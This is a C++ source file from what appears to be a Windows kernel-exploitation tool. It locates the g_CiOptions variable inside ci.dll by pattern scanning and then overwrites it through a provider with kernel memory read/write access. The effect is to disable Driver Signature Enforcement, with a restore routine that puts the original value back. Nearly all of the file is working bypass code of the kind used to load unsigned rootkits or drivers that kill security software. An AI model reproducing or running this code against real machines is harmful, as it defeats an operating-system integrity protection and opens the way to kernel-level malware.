/**
 * @file DSE.cpp
 * @author Gregory King
 * @date August 13, 2025
 * @brief This file contains the implementation of the DSE class.
 *
 * Implements the logic for finding and patching the g_CiOptions kernel
 * variable to control Driver Signature Enforcement. It includes pattern
 * scanning within the Code Integrity module (ci.dll) to locate the
 * target variable dynamically.
 */

#include "DSE.h"
#include "Utils.h"
#include <iostream>
#include <vector>
#include <Windows.h>

namespace {
    /**
     * @brief Scans a memory region for a given byte pattern.
     * @param base The base address of the memory region to scan.
     * @param size The size of the memory region.
     * @param pattern The byte pattern to search for.
     * @param mask A mask string indicating which bytes in the pattern to match ('x') and which to ignore ('?').
     * @return The address where the pattern was found, or 0 if not found.
     */
    uintptr_t FindPattern(uintptr_t base, size_t size, const char* pattern, const char* mask) {
        size_t patternLength = strlen(mask);
        for (size_t i = 0; i < size - patternLength; ++i) {
            bool found = true;
            for (size_t j = 0; j < patternLength; ++j) {
                if (mask[j] != '?' && pattern[j] != *(char*)(base + i + j)) {
                    found = false;
                    break;
                }
            }
            if (found) {
                return base + i;
            }
        }
        return 0;
    }
}

namespace KernelMode {

    DSE::DSE(std::shared_ptr<Providers::IProvider> provider)
        : provider(std::move(provider)), ciOptionsAddress(0), originalCiOptions(-1) {}

    bool DSE::FindCiOptions() {
        if (ciOptionsAddress != 0) {
            return true; // Already found
        }

        uintptr_t ciBase = Utils::GetKernelModuleBase("ci.dll");
        if (!ciBase) {
            std::wcerr << L"[-] Failed to get base address of ci.dll." << std::endl;
            return false;
        }

        // Load ci.dll into our address space to parse its headers and sections.
        char systemPath[MAX_PATH];
        GetSystemDirectoryA(systemPath, MAX_PATH);
        strcat_s(systemPath, "\\ci.dll");
        HMODULE ciModule = LoadLibraryExA(systemPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (!ciModule) {
            std::wcerr << L"[-] Failed to load ci.dll into user space: " << GetLastError() << std::endl;
            return false;
        }

        auto dosHeader = (PIMAGE_DOS_HEADER)ciModule;
        auto ntHeaders = (PIMAGE_NT_HEADERS)((uintptr_t)ciModule + dosHeader->e_lfanew);
        
        // Pattern for "lea rcx, g_CiOptions"
        // 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 8B C8
        const char* pattern = "\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x8B\xC8";
        const char* mask = "xxx????x????xx";

        uintptr_t patternAddress = FindPattern((uintptr_t)ciModule, ntHeaders->OptionalHeader.SizeOfImage, pattern, mask);
        
        if (!patternAddress) {
            std::wcerr << L"[-] Could not find g_CiOptions pattern in ci.dll." << std::endl;
            FreeLibrary(ciModule);
            return false;
        }

        // The instruction is LEA RCX, [RIP + offset]
        // The address of g_CiOptions is RIP + offset, where RIP is the address of the *next* instruction.
        // Instruction address is patternAddress. Instruction size is 7 bytes.
        // So, RIP = patternAddress + 7
        // The offset is the 4-byte value at patternAddress + 3
        int32_t offset = *(int32_t*)(patternAddress + 3);
        uintptr_t rva = (patternAddress - (uintptr_t)ciModule) + 7 + offset;
        
        this->ciOptionsAddress = ciBase + rva;
        
        FreeLibrary(ciModule);

        std::wcout << L"[+] Found g_CiOptions at kernel address: 0x" << std::hex << this->ciOptionsAddress << std::endl;

        // Read and store the original value
        if (!provider->ReadKernelMemory(this->ciOptionsAddress, this->originalCiOptions)) {
            std::wcerr << L"[-] Failed to read original g_CiOptions value." << std::endl;
            this->ciOptionsAddress = 0; // Invalidate address
            return false;
        }

        std::wcout << L"[+] Original g_CiOptions value: 0x" << std::hex << this->originalCiOptions << std::endl;
        return true;
    }

    bool DSE::Disable() {
        if (!FindCiOptions()) {
            return false;
        }

        int desiredValue = 0; // DSE disabled
        if (!provider->WriteKernelMemory(this->ciOptionsAddress, desiredValue)) {
            std::wcerr << L"[-] Failed to write to g_CiOptions." << std::endl;
            return false;
        }

        int currentValue = -1;
        provider->ReadKernelMemory(this->ciOptionsAddress, currentValue);
        if (currentValue == 0) {
            std::wcout << L"[+] DSE disabled successfully." << std::endl;
            return true;
        }
        
        std::wcerr << L"[-] Failed to verify DSE patch." << std::endl;
        return false;
    }

    bool DSE::Restore() {
        if (this->ciOptionsAddress == 0 || this->originalCiOptions == -1) {
            std::wcerr << L"[-] Cannot restore DSE, original state not saved." << std::endl;
            return false;
        }

        if (!provider->WriteKernelMemory(this->ciOptionsAddress, this->originalCiOptions)) {
            std::wcerr << L"[-] Failed to restore g_CiOptions." << std::endl;
            return false;
        }

        int currentValue = -1;
        provider->ReadKernelMemory(this->ciOptionsAddress, currentValue);
        if (currentValue == this->originalCiOptions) {
            std::wcout << L"[+] DSE restored successfully." << std::endl;
            return true;
        }

        std::wcerr << L"[-] Failed to verify DSE restoration." << std::endl;
        return false;
    }
}